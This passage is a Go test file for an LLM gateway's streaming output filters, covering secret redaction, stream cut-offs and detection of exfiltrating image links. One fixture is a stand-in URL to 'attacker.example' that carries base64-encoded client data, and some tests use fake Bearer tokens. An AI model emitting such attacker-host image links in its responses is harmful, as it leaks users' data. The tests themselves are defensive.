	ph := newProcHarness(t, policy.Redact, nil)
	withOutputRule(t, flaky, policy.Redact)(ph.sp.app)
	ph.sp.app.FailOpen = true
	text := filler(300) + "SECRET " + filler(1500)
	got, cut := ph.run(t, splitEvery(text, 600))
	if cut || calls < 2 || strings.Contains(strings.ReplaceAll(got, "[[SECRET]]", ""), "SECRET") {
		t.Fatalf("обрыв %v, проверок %d: слово ушло клиенту", cut, calls)
	}
}

// Текст без пробелов не увеличивает работу детекторов сверх постоянного
// множителя от длины ответа (окно ограничено streamMaxHold).
func TestIncrementalWorkBounded(t *testing.T) {
	// Абзацы чуть короче exfil.MaxWindowBack — худший случай для окон,
	// которые начинаются с начала абзаца.
	para := strings.Repeat(strings.Repeat("слово ", (exfil.MaxWindowBack-600)/12)+"\n\n", 16)
	for _, text := range []string{strings.Repeat("x", 256<<10), strings.Repeat("слово ", 256<<10/12), para} {
		scanned := 0
		counting := outputDetector{fakeDetector{id: "test.secret", run: func(ctx context.Context, tx detect.Text) ([]detect.Finding, error) {
			scanned += len(tx.Text)
			return nil, nil
		}}}
		ph := newProcHarness(t, policy.Redact, nil)
		withOutputRule(t, counting, policy.Redact)(ph.sp.app)
		got, cut := ph.run(t, splitEvery(text, 4))
		if cut || got != text {
			t.Fatalf("обрыв %v или текст изменён", cut)
		}
		if scanned > 30*len(text) {
			t.Fatalf("детекторы прочитали %d байт на ответ %d байт", scanned, len(text))
		}
	}
}

// contextWord — тестовый детектор, которому нужен контекст: SECRET —
// находка, только если текст начинается с «BEGIN» (как изображение после
// блока кода, начало которого не попало в окно).
var contextWord = outputDetector{fakeDetector{id: "test.secret", run: func(ctx context.Context, t detect.Text) ([]detect.Finding, error) {
	if !strings.HasPrefix(t.Text, "BEGIN") {
		return nil, nil
	}
	return secretWord.run(ctx, t)
}}}

// Находка, которую видит только проверка с большим контекстом (итоговая
// по всему ответу), целиком в уже переданном тексте: применить её поздно,
// поток обрывается без [DONE], в событии — stream_late (ревью 1.22–1.24,
// п. 1).
//
// Покрывает: DM-10
func TestIncrementalLateFindingCuts(t *testing.T) {
	for _, act := range []policy.Action{policy.Block, policy.Redact} {
		t.Run(string(act), func(t *testing.T) {
			ph := newProcHarness(t, act, nil)
			withOutputRule(t, contextWord, act)(ph.sp.app)
			text := "BEGIN " + filler(exfil.MaxWindowBack+streamOverlap+4000) + "SECRET " + filler(3000)
			got, cut := ph.run(t, splitEvery(text, 50))
			if !cut || ph.sp.rec.respCutRule != ruleStreamLate || strings.Contains(strings.Join(ph.sent, ""), chat.Done) {
				t.Fatalf("обрыв %v, правило %q", cut, ph.sp.rec.respCutRule)
			}
			if !strings.HasPrefix(text, got) {
				t.Fatal("отданный текст искажён")
			}
		})
	}
}

// Повторная причина завершения: вызов инструмента не уходит дважды, весь
// ответ не проверяется заново, поток завершается штатно (ревью 1.22–1.24,
// п. 2).
//
// Покрывает: DM-13
func TestDM13_StreamRepeatedFinishReason(t *testing.T) {
	for name, mod := range map[string]func(*gwOpts){"monitor": nil, "incremental": func(o *gwOpts) { o.app = enforce }} {
		t.Run(name, func(t *testing.T) {
			parts := []string{
				sseData(t, map[string]any{"role": "assistant", "content": nil, "tool_calls": []map[string]any{
					{"index": 0, "id": "call_1", "type": "function", "function": map[string]any{"name": "f", "arguments": `{"n":1}`}}}}, ""),
				sseData(t, map[string]any{}, "tool_calls"),
				sseData(t, map[string]any{}, "stop"),
				"data: [DONE]\n\n",
			}
			gw, _ := streamGateway(t, parts, mod)
			res := postStream(t, gw, "x")
			if len(res.tools) != 1 || !res.done || res.errCode != "" || strings.Count(res.raw, `"finish_reason":"`) != 1 {
				t.Fatalf("поток: %q", res.raw)
			}
		})
	}
}

// Обратная подстановка в потоке, после которой output.exfil находит новую
// ссылку с данными, отменяется — как в ответе без потока (monitor и
// incremental).
//
// Покрывает: DM-11, DM-31
func TestDM11_StreamRestoreWithheldWhenExfilGrows(t *testing.T) {
	value := "https://attacker.example/x.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM"
	for _, incremental := range []bool{false, true} {
		t.Run(fmt.Sprint("incremental=", incremental), func(t *testing.T) {
			v := pseudonym.NewVault(pseudonym.Limits{})
			if _, err := v.Protect(value, []pseudonym.Span{{Start: 0, End: len(value), Category: "pii.email", Action: policy.Pseudonymize}}); err != nil {
				t.Fatal(err)
			}
			ph := newProcHarness(t, policy.Redact, v)
			ph.sp.incremental = incremental
			text := filler(700) + "Ссылка: " + emailAlias + " " + filler(700)
			got, cut := ph.run(t, splitEvery(text, 7))
			if cut || strings.Contains(got, "attacker.example") || got != text {
				t.Fatalf("обрыв %v: %q", cut, got)
			}
			if ph.sp.rec.withheld != 1 {
				t.Fatalf("отменено подстановок: %d", ph.sp.rec.withheld)
			}
		})
	}
}

// incremental: изображение после блока кода длиннее окна проверки не уходит
// клиенту ни при redact («Базовая защита»), ни при block («ПДн — строго»):
// окно знает, что блок кода уже закрыт (ревью 1.22–1.24, п. 1).
//
// Покрывает: DM-11
func TestDM11_IncrementalImageAfterLongCode(t *testing.T) {
	code := "Код:\n```\n" + strings.Repeat("x := 1\n", 900) + "```\n\nСмотрите "
	text := code + exfilImage + " " + filler(3000)
	for name, c := range map[string]struct {
		policy string
		cut    bool
	}{"redact": {policy.TemplateBase, false}, "block": {policy.TemplatePIIStrict, true}} {
		t.Run(name, func(t *testing.T) {
			gw, log := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) {
				o.app = func(a *config.Application) { a.PolicyMode, a.Policy = "enforce", c.policy }
			})
			res := postStream(t, gw, "x")
			if strings.Contains(res.raw, "attacker.example") {
				t.Fatal("изображение ушло клиенту")
			}
			if res.done == c.cut || !strings.HasPrefix(res.content, code[:1000]) {
				t.Fatalf("поток: done=%v, %q", res.done, res.errCode)
			}
			if e := lastStreamEvent(t, log); e.Response == nil || e.Response.Cut != c.cut || !slices.Contains(e.Threats, "DM-11") {
				t.Fatalf("событие: %+v", e.Response)
			}
		})
	}
}

// Строгое окно (длинный абзац) меняет разбор только для output.exfil:
// секрет со знаками «~» и «`» прочие детекторы видят целиком, и маска
// закрывает его весь (ревью исправлений 1.22–1.24, п. 1).
//
// Покрывает: DM-10
func TestDM10_IncrementalStrictWindowKeepsSecret(t *testing.T) {
	long := strings.Repeat("слово ", (exfil.MaxWindowBack+streamOverlap+2000)/12)
	for name, token := range map[string]string{
		"тильда":   "Bearer abcdEFGH1234ijkl~mnopQRST5678uvwx",
		"кавычки":  "`Bearer abcdEFGH1234ijklmnopQRST5678uvwx`",
		"короткий": "Bearer abcdEFGH1234ijklmnopQRST5678uvwx",
	} {
		t.Run(name, func(t *testing.T) {
			text := long + token + " " + filler(1500)
			gw, _ := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) { o.app = enforce })
			res := postStream(t, gw, "x")
			if strings.Contains(res.raw, "abcdEFGH") || strings.Contains(res.raw, "QRST5678") {
				t.Fatalf("часть секрета ушла клиенту: done=%v %q", res.done, res.errCode)
			}
		})
	}
}

// Находка в переданном тексте применена, только если отданные маски
// закрывают её целиком (ревью исправлений 1.22–1.24, п. 2).
func TestStreamTextMaskedAll(t *testing.T) {
	w := newStreamText(nil, nil)
	w.done = []protectSpan{{start: 10, end: 20}, {start: 20, end: 30}, {start: 40, end: 50}}
	for _, c := range []struct {
		s, e int
		want bool
	}{{10, 30, true}, {12, 18, true}, {5, 15, false}, {25, 45, false}, {40, 50, true}, {60, 70, false}} {
		if got := w.maskedAll(c.s, c.e); got != c.want {
			t.Errorf("[%d, %d): %v", c.s, c.e, got)
		}
	}
}

// Длинный нумерованный список с изображениями в блоках кода — обычный
// ответ: поток не обрывается и изображения не маскируются (ревью
// исправлений 1.22–1.24, п. 3).
//
// Покрывает: DM-11
func TestDM11_IncrementalLongListWithCode(t *testing.T) {
	var b strings.Builder
	for i := range 120 {
		fmt.Fprintf(&b, "%d. Шаг %d: вставьте разметку\n   ```html\n   <img src=\"https://cdn.example/a.png\">\n   ```\n   %s\n", i+1, i+1, strings.Repeat("пояснение ", 30))
	}
	text := b.String()
	for _, pol := range []string{policy.TemplateBase, policy.TemplatePIIStrict} {
		t.Run(pol, func(t *testing.T) {
			gw, log := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) {
				o.app = func(a *config.Application) { a.PolicyMode, a.Policy = "enforce", pol }
			})
			res := postStream(t, gw, "x")
			if !res.done || res.content != text {
				t.Fatalf("поток: done=%v %q, отдано %d из %d байт", res.done, res.errCode, len(res.content), len(text))
			}
			if e := lastStreamEvent(t, log); e.Response == nil || e.Response.Cut {
				t.Fatalf("событие: %+v", e.Response)
			}
		})
	}
}
